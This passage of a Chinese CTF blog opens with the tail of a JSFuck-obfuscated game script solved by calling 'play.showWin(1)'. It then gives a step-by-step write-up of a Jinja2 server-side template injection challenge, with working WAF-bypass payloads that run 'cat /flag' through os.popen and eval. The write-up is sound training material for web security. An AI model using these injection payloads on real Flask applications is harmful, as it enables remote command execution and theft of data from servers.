+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+[![]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		alert(&quot;很遗憾，你输了！&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>突破点在最后<br><code>play.showWin = function (my)</code>详解:这是 JavaScript 中定义一个方法（函数）的语法<br>即给 <code>play</code> 这个对象添加一个 <code>showWin</code> 方法，这个方法实际上是一个函数，接收 <code>my</code> 参数用来显示游戏结果，注意my 是形参<br>但是调用方式不同：函数直接 <code>函数名()</code>，方法通过 <code>对象.方法名()</code><br>所以payload为<code>play.showWin(1)</code><br>具体执行过程为：首先找到play对象(因为<code>showWin</code>属于<code>play</code>对象 不在全局) 然后从<code>play</code>里取出<code>showWin</code>属性 最后调用这个方法并且传入参数 1<br>实现了<code>my === 1</code>符合判断条件<br>得到flag<br><img src="/images/Pastedimage20260724174053.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：buuctf  GenShin<br>题目链接(<a target="_blank" rel="noopener" href="http://8d98d074cd6443fd50a0a971.http-ctf2.dasctf.com/">http://8d98d074cd6443fd50a0a971.http-ctf2.dasctf.com/</a>)<br>题目描述：<br>解题思路：<br>启动靶机 得到<br><img src="/images/Pastedimage20260724182249.png"><br>查看源码<br><img src="/images/Pastedimage20260724184456.png"><br>发现没有线索 抓包试试<br><img src="/images/Pastedimage20260724184342.png"><br>发现 <code>/secr3tofpop</code> 这个目录或文件访问一下<br><img src="/images/Pastedimage20260724184801.png"><br>需要通过GET传参传递一个 <code>name</code> 参数<br><img src="/images/Pastedimage20260724185528.png"></p>
+
+猜测name是注入点 试一下ssti注入 payload:`?name=${{7*7}}`
+
+<p><img src="/images/Pastedimage20260724190744.png"></p>
+
+思路正确 但是`{{7*7}}` 被拦截了
+尝试各种情况 发现`{% print(7*7) %}`可以得到49 说明拦截了最常见的 `{{`  但忽略了 `{%` 
+
+<p><img src="/images/Pastedimage20260724191446.png"></p>
+
+首先`{% print(config) %}`判断是Twig还是Jinja2
+
+<p>得到<img src="/images/Pastedimage20260724191745.png"><br>是 Jinja2 Python Flask框架</p>
+
+payload:`{% print(config.__class__.__init__.__globals__['os'].popen('cat /flag').read()) %}`
+
+<p><img src="/images/Pastedimage20260724191845.png"><br>发现被拦截<br>正确的payload:</p>
+
+`?name={%print""|attr('__class__')|attr('__base__')|attr('__subclasses__')|attr(10)|attr('__in'+'it__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getiem__')('e'+'val')("ev"+"al('__import__('os').po'+'pen('cat /flag').read()')")%}`
+
+<p>该题利用了1.字符串拼接（<code>&#39;__in&#39;+&#39;it__&#39;</code>）<br>          2.用 <code>attr()</code> 代替点号<br>          3.用 <code>__getitem__()</code> 代替 <code>[]</code><br>          4.用 <code>eval()</code> 执行最终代码(这是重点)<br>          5.所有危险词都在字符串内部</p>
+
+          6.`{% print() %}`执行并输出 并且`print` 后面必须加空格 否则 Jinja2 解析器会认不出来
+          7.{{ 变量 | 过滤器 }}绕过 WAF 对点号 `.` 的检测
+
+<p>除去这些绕过 整个链为<code>&#39;&#39;.__class__.__base__.__subclasses__()[10].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&quot;)</code>        </p>
+
+**通用做法**:1. 先执行 `{{ ''.__class__.__base__.__subclasses__() }}` 查看所有类
+
+<pre><code>    2. 找到合适的类
+    3. 记录索引号，再用 `[索引]` 取用
+    4.取出 eval 并执行命令
+</code></pre>
+<p>  整个payload：<br><code>.__class__</code>获取字符串的类（<code>&lt;class &#39;str&#39;&gt;</code>)<br><code>.__base__</code>获取父类（<code>&lt;class &#39;object&#39;&gt;</code>）<br><code>.__subclasses__()</code>获取所有子类列表<br><code>[10]</code>取第10个子类 (这个题目取任意值应该都可以 我尝试了1，8，9，10，100都能拿到flag)<br><code>.__init__</code>获取初始化方法<br><code>.__globals__</code>获取全局变量字典<br><code>[&#39;__builtins__&#39;]</code>获取内置函数<br><code>[&#39;eval&#39;]</code>获取 eval 函数<br><code>(&quot;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&quot;)</code>要执行的代码<br><img src="/images/Pastedimage20260724194355.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/07/24/2026-07-24-buuctf%20%20[VNCTF2023]%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90/" data-id="cmspupgt300031cuy8fvchly7" data-title="buuctf  [VNCTF2023]象棋王子" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/08/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/">ctfshow 命令执行web44</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 l-y-f<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
